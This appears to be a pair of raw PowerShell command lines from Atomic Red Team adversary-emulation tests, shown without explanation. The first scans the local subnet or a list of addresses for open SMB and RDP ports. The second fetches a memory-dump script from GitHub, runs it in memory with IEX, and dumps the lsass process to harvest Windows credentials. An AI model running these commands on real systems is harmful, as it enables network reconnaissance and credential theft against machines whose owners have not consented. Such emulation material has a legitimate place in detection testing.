"powershell.exe" & {$ipAddr = \""\""
if ($ipAddr -like \""*,*\"") {
    $ip_list = $ipAddr -split \"",\""
    $ip_list = $ip_list.ForEach({ $_.Trim() })
    Write-Host \""[i] IP Address List: $ip_list\""

    $ports = 445, 3389

    foreach ($ip in $ip_list) {
        foreach ($port in $ports) {
            Write-Host \""[i] Establishing connection to: $ip : $port\""
            try {
                $tcp = New-Object Net.Sockets.TcpClient
                $tcp.ConnectAsync($ip, $port).Wait(200) | Out-Null
            } catch {}
            if ($tcp.Connected) {
                $tcp.Close()
                Write-Host \""Port $port is open on $ip\""
            }
        }
    }
} elseif ($ipAddr -notlike \""*,*\"") {
    if ($ipAddr -eq \""\"") {
        # Assumes the \""primary\"" interface is shown at the top
        $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1
        Write-Host \""[i] Using Interface $interface\""
        $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress
    }
    Write-Host \""[i] Base IP-Address for Subnet: $ipAddr\""
    $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)
    # Always assumes /24 subnet
    Write-Host \""[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'\""

    $ports = 445, 3389
    $subnetIPs = 1..254 | ForEach-Object { \""$subnetSubstring$_\"" }

    foreach ($ip in $subnetIPs) {
        foreach ($port in $ports) {
            try {
                $tcp = New-Object Net.Sockets.TcpClient
                $tcp.ConnectAsync($ip, $port).Wait(200) | Out-Null
            } catch {}
            if ($tcp.Connected) {
                $tcp.Close()
                Write-Host \""Port $port is open on $ip\""
            }
        }
    }
} else {
    Write-Host \""[Error] Invalid Inputs\""
    exit 1
}}

"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory \""C:\AtomicRedTeam\atomics\..\ExternalPayloads\\"" -ErrorAction Ignore -Force | Out-Null
try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}
catch{ $_; exit $_.Exception.Response.StatusCode.Value__}
get-process lsass | Out-Minidump}

